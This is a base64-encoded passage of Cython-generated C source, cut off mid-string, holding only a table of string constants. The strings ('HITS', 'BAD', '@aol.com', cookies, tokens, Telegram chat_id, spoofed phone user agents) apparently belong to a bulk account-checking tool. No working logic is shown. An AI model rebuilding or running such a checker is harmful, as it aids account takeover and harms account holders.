MjIwXDAyMVwzMzBcMDE0XDAyMFwyMjBcMDEwXDIzMFwwMDFcMjMwXDAzMFwyNDBcMDIxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19DW10gPSAiQyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUVtdID0gIlwyMzBRIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lW10gPSAiZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZltdID0gImYiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lbXSA9ICJpIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19rW10gPSAiayI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb1tdID0gIm8iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JbXSA9ICJyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa193W10gPSAidyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfeFtdID0gIngiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzBtW10gPSAiXDAzM1swbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMW1bXSA9ICJcMDMzWzFtIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19JZFtdID0gIklkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19UTFtdID0gIlRMIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMltdID0gIioiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18zW10gPSAiW1wiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNFtdID0gIlwiLFwiIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNVtdID0gIi8vIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fNltdID0gIlxuIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fN1tdID0gIkAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX184W10gPSAiOyAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX185W10gPSAiKSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2NbXSA9ICJjYyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2NbXSA9ICJnYyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2dbXSA9ICJnZyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbjFbXSA9ICJuMSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbjJbXSA9ICJuMiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbnRbXSA9ICJudCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb2tbXSA9ICJvayI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3NbXSA9ICJvcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcGtbXSA9ICJwayI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHBbXSA9ICJwcCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVbXSA9ICJyZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcnJbXSA9ICJyciI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3NbXSA9ICJzcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGZbXSA9ICJ0ZiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdGxbXSA9ICJ0bCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdWFbXSA9ICJ1YSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfeXlbXSA9ICJ5eSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMV8yW10gPSAiXDIzMDEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzkxbVtdID0gIlwwMzNbOTFtIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa185Mm1bXSA9ICJcMDMzWzkybSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfOTNtW10gPSAiXDAzM1s5M20iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzk0bVtdID0gIlwwMzNbOTRtIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa185NW1bXSA9ICJcMDMzWzk1bSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfOTZtW10gPSAiXDAzM1s5Nm0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzk3bVtdID0gIlwwMzNbOTdtIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BX1FbXSA9ICJcMjAwQVwzMzBcclwwMjFcMjIwXDAyMVwzMzBcMDE0XDAyMFwyMjBcMDEwXDIzMFwwMDFcMzIwXDAzMS1cMjUwUSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQkFEW10gPSAiQkFEICAgICAgOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0hUQ1tdID0gIkhUQyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfTl9BW10gPSAiTi9BIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SRURbXSA9ICJSRUQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1pURVtdID0gIlpURSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzEwW10gPSAiXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzExW10gPSAiICAgICAgICI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzEyW10gPSAiICAgICAgICAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX18xM1tdID0gIlwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMFwzNDJcMjI0XDIwMCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzE0W10gPSAiLiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfXzE1W10gPSAiXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxXDM0MlwyMjRcMjAxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTZbXSA9ICI/IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19fMTdbXSA9ICJcMjMwXDAwMSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYmFkW10gPSAiYmFkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19iaW9bXSA9ICJiaW8iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Nsc1tdID0gImNscyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZGV2W10gPSAiZGV2IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kbnRbXSA9ICJkbnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RvY1tdID0gIl9fZG9jX18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RwaVtdID0gImRwaTsgIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lbmRbXSA9ICJlbmQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2dldFtdID0gImdldCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ2diW10gPSAiZ2diIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19oZTNbXSA9ICJoZTMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2tleVtdID0gImtleSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbHNkW10gPSAibHNkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tZDVbXSA9ICJtZDUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3BvcFtdID0gInBvcCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVkW10gPSAicmVkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ydW5bXSA9ICJydW4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3N1bVtdID0gInN1bSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3lzW10gPSAic3lzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190bGxbXSA9ICJ0bGwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Rva1tdID0gInRvayI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdWlkW10gPSAidWlkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa191cmxbXSA9ICJ1cmwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3V1aVtdID0gInV1aSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd2lkW10gPSAid2lkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BU1VTW10gPSAiQVNVUyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQkxVRVtdID0gIkJMVUUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0JPTERbXSA9ICJCT0xEIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19DWUFOW10gPSAiQ1lBTiI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfSElUU1tdID0gIkhJVFMgICAgIDogIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Ib3N0W10gPSAiSG9zdCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfTElNRVtdID0gIkxJTUUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0xvY2tbXSA9ICJMb2NrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19Ob25lW10gPSAiTm9uZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfT1BQT1tdID0gIk9QUE8iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1BJTktbXSA9ICJQSU5LIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19TTV9UW10gPSAiOyBTTS1UIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19TT05ZW10gPSAiU09OWSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfVHJ1ZVtdID0gIlRydWUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1ZJVk9bXSA9ICJWSVZPIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19XSUZJW10gPSAiV0lGSSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYWRpZFtdID0gImFkaWQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RhdGFbXSA9ICJkYXRhIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kYXRlW10gPSAiZGF0ZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZG9uZVtdID0gImRvbmUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2V4aXRbXSA9ICJfX2V4aXRfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZm9udFtdID0gImZvbnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Zvd2dbXSA9ICJmb3dnIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19mb3dzW10gPSAiZm93cyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZnVuY1tdID0gIl9fZnVuY19fIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ndWlkW10gPSAiZ3VpZCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfaGl0c1tdID0gImhpdHMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2hvc3RbXSA9ICJob3N0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19pbml0W10gPSAiX19pbml0X18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2pzb25bXSA9ICJqc29uIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19sb2NrW10gPSAibG9jayI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbWFpbltdID0gIl9fbWFpbl9fIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tZXRhW10gPSAibWV0YSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfbmFtZVtdID0gIm5hbWUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX25leHRbXSA9ICJuZXh0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19udWxsW10gPSAiXCIsbnVsbCxcIihbXlwiXSspXCIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX29wZW5bXSA9ICJvcGVuIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19wb3N0W10gPSAicG9zdCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcHl0eltdID0gInB5dHoiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JlYWRbXSA9ICJyZWFkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19yZXMxW10gPSAicmVzMSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVzdFtdID0gInJlc3QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NlbGZbXSA9ICJzZWxmIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZW5kW10gPSAic2VuZCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3BlY1tdID0gIl9fc3BlY19fIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190ZXN0W10gPSAiX190ZXN0X18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RleHRbXSA9ICJ0ZXh0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa190aW1lW10gPSAidGltZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdHJ1ZVtdID0gInRydWUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3VzZXJbXSA9ICJ1c2VyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa191dWlkW10gPSAidXVpZCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfd2FpdFtdID0gIndhaXQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzFfMDAwW10gPSAiLTEuMDAwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18xa2Jwc1tdID0gIi0xa2JwcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQV80eHFbXSA9ICJcMjAwQVwzMzBcclwwMjFcMjIwXDAyMVwzMzBcMDE0XDAyM1wyMjA0XDIyMHhcMjMwcVwyNDBcMDAxIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19BX1FfMltdID0gIlwyMDBBXDMzMFwwMTBcclwyMTBRIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19FbWFpbFtdID0gIlxuXDM2MFwyMzdcMjIzXDI0NyAgRW1haWwgICAgICAgICAgOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0ZhbHNlW10gPSAiRmFsc2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0dIT1NUW10gPSAiR0hPU1QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0dSRUVOW10gPSAiR1JFRU4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0dob3N0W10gPSAiR2hvc3QiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0xpZ2VyW10gPSAiTGlnZXIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1Bvc3RzW10gPSAiXG5cMzYwXDIzN1wyMjZcMjc0XDM1N1wyNzBcMjE3ICBQb3N0cyAgICAgICAgICA6ICI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUkVTRVRbXSA9ICJSRVNFVCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfU1RBVFNbXSA9ICJcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDBcMzQyXDIyNFwyMDAgU1RBVFMgXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwXDM0MlwyMjRcMjAwIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19XSElURVtdID0gIldISVRFIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hbGlnbltdID0gImFsaWduIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19ibG9ja1tdID0gImJsb2NrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19icmFuZFtdID0gImJyYW5kIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jaGVja1tdID0gImNoZWNrIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbGVhcltdID0gImNsZWFyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jbG9zZVtdID0gImNsb3NlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb3VudFtdID0gImNvdW50IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19kcGlfMltdID0gImRwaSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZHVtcHNbXSA9ICJkdW1wcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW1haWxbXSA9ICJlbWFpbCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZW50ZXJbXSA9ICJfX2VudGVyX18iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2ZfcmVxW10gPSAiZi5yZXEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2dyb3VwW10gPSAiZ3JvdXAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2lucHV0W10gPSAiaW5wdXQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2l0ZW1zW10gPSAiaXRlbXMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX21hdGNoW10gPSAibWF0Y2giOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3ByaW50W10gPSAicHJpbnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3F1ZXJ5W10gPSAicXVlcnkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JhbmdlW10gPSAicmFuZ2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NsZWVwW10gPSAic2xlZXAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NwYWNlW10gPSAic3BhY2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3NwbGl0W10gPSAic3BsaXQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3N0YXJ0W10gPSAic3RhcnQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Rocm93W10gPSAidGhyb3ciOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3Rva2VuW10gPSAidG9rZW4iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RvdGFsW10gPSAidG90YWwiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3VfMV9pW10gPSAidT0xLCBpIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa191dWlkNFtdID0gInV1aWQ0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa192YWx1ZVtdID0gInZhbHVlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa193aGl0ZVtdID0gIndoaXRlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa193cml0ZVtdID0gIndyaXRlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18yM182XzBbXSA9ICIyMy82LjAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzI0XzdfMFtdID0gIjI0LzcuMCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfMjZfOF8wW10gPSAiMjYvOC4wIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa18yN184XzFbXSA9ICIyNy84LjEiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rXzI4XzlfMFtdID0gIjI4LzkuMCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfM2JyVHZ3W10gPSAiM2JyVHZ3PT0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0NvbG9yc1tdID0gIkNvbG9ycyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfQ29va2llW10gPSAiQ29va2llIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19IVUFXRUlbXSA9ICJIVUFXRUkiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX09SQU5HRVtdID0gIk9SQU5HRSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUFVSUExFW10gPSAiUFVSUExFIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19SRUFMTUVbXSA9ICJSRUFMTUUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1hJQU9NSVtdID0gIlhJQU9NSSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfWUVMTE9XW10gPSAiWUVMTE9XIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hY2NlcHRbXSA9ICJhY2NlcHQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2JhZF9nbVtdID0gImJhZF9nbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfYmFzZTY0W10gPSAiYmFzZTY0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jZW50ZXJbXSA9ICJjZW50ZXIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Nmb250c1tdID0gImNmb250cyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2hvaWNlW10gPSAiY2hvaWNlIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb2xvcnNbXSA9ICJjb2xvcnMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2RpZ2l0c1tdID0gImRpZ2l0cyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZG9jX2lkW10gPSAiZG9jX2lkIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19lbmFibGVbXSA9ICJlbmFibGUiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Z1dHVyZVtdID0gImZ1dHVyZSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfZ29vZGlnW10gPSAiZ29vZGlnIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19tb2R1bGVbXSA9ICJfX21vZHVsZV9fIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19uYW1lXzJbXSA9ICJfX25hbWVfXyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfb3JpZ2luW10gPSAib3JpZ2luIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19wYXJhbXNbXSA9ICJwYXJhbXMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3JhbmRvbVtdID0gInJhbmRvbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfcmVuZGVyW10gPSAicmVuZGVyIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zZWFyY2hbXSA9ICJzZWFyY2giOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3N0cmluZ1tdID0gInN0cmluZyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfc3VibWl0W10gPSAic3VibWl0IjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19zeXN0ZW1bXSA9ICJzeXN0ZW0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX3RsX3R4dFtdID0gInRsLnR4dCI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfdXNlcklEW10gPSAidXNlcklEIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa192YWx1ZXNbXSA9ICJ2YWx1ZXMiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX0NoYW5uZWxbXSA9ICJDaGFubmVsIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19JbmZvQWNjW10gPSAiSW5mb0FjYyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfTEdFX2xnZVtdID0gIkxHRS9sZ2UiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX01BR0VOVEFbXSA9ICJNQUdFTlRBIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19PTkVQTFVTW10gPSAiT05FUExVUyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfUHJpdmF0ZVtdID0gIlxuXDM2MFwyMzdcMjI0XDIyMiAgUHJpdmF0ZSAgICAgICAgOiAiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX1NBTVNVTkdbXSA9ICJTQU1TVU5HIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19hbmRyb2lkW10gPSAiYW5kcm9pZC0iOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2FvbF9jb21bXSA9ICJAYW9sLmNvbSI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY2hhdF9pZFtdID0gImNoYXRfaWQiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Nob2ljZXNbXSA9ICJjaG9pY2VzIjsKc3RhdGljIGNvbnN0IGNoYXIgX19weXhfa19jb29raWVzW10gPSAiY29va2llcyI7CnN0YXRpYyBjb25zdCBjaGFyIF9fcHl4X2tfY291bnRlcltdID0gImNvdW50ZXIiOwpzdGF0aWMgY29uc3QgY2hhciBfX3B5eF9rX2Rpc2FibGV